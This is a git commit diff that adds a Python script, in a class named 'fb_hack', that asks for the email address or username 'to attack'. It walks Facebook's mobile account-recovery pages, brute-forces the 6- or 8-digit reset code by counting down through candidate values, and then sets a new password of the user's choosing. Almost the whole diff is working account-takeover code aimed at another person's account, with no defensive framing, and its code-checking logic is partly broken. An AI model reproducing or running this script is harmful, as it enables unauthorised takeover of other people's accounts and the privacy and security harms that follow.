33b9dca757baeb8472b3e3556214437dd61eadcf
krarktel112 <krarktel@gmail.com>
2024-08-28 19:42:20 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -133,4 +133,90 @@ else:
     browser.form['password_new'] = new
   """browser.form['n'] = x"""
 class fb_hack(object):
-  
+  os.system('clear')
+soup = BeautifulSoup()
+email = input('Email address or username to attack:')
+"""password = input('Password:')"""
+browser = mechanize.Browser()
+browser.set_handle_robots(False)
+cookies = mechanize.CookieJar()
+browser.set_cookiejar(cookies)
+browser.addheaders = [('User-agent', MOZILLA_UAS)]
+browser.set_handle_refresh(False)
+browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+browser.select_form(nr=0)
+browser.form['email'] = email
+browser.submit()
+"""selection confirmation"""
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+browser.select_form(nr=0)
+browser.submit()
+"""reset code input"""
+browser.select_form(nr=0)
+reset = input('Code: ')
+browser.form['n'] = reset
+browser.submit()
+reset = 999999
+response1 = browser.response()
+soup = BeautifulSoup(response1, 'html.parser')
+test = soup.find(string="poop")
+check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+if check1 != test:
+  print(check1)
+  reset = 999999
+else:
+  print(check2)
+  reset = 99999999
+if check1 != test:
+  while check1 != test or reset > 999999:  
+    browser.select_form(nr=0)
+    y = reset
+    browser.form['n'] = str(y)
+    browser.submit()
+    print(str(reset), end='\r')
+    fail = (str(y), "failed")
+    s = " "
+    reset = reset-1
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+    if check2 == check4:
+      print(s.join(fail))
+      sleep(30)
+    else:
+      z = 1
+elif check2 != test:
+  while check2 != test or reset > 99999999:
+    browser.select_form(nr=0)
+    y = reset
+    browser.form['n'] = str(y)
+    browser.submit()
+    print(str(reset), end='\r')
+    fail = (str(y), "failed")
+    s = " "
+    reset = reset-1
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
+    if check2 == check4:
+      print(s.join(fail))
+      sleep(30)
+    else:
+      z = 1
+else:
+  response1 = browser.response()
+  soup = BeautifulSoup(response1, 'html.parser')
+  print(soup.find(string="password_new"))
+  yes = input('Continue/Exit? ')
+  if yes == 'n':
+    exit()
+  else:
+    new = input('New Password: ')
+    browser.select_form(nr=0)
+    browser.form['password_new'] = new
